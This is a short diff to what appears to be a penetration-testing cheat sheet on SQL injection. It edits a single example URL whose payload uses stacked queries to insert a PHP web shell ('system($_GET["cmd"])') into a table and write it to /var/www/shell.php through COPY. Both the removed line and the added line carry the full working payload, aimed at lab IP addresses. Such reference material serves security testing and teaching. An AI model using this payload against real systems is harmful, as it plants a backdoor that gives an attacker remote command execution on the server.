@@ -26,7 +26,7 @@
 
 If write permission is granted, new files can be created with desired file contents:
 
-    10.10.10.46/dashboard.php?search=elixir' union all select null,null,null,null,null; CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('<?php system($_GET["cmd"])?>'); COPY pentestlab(t) TO '/var/www/shell.php'; --#
+    http://10.10.10.4/index.php?search=abc' union all select null,null,null,null,null; CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('<?php system($_GET["cmd"])?>'); COPY pentestlab(t) TO '/var/www/shell.php'; --#
 
 ## References
 
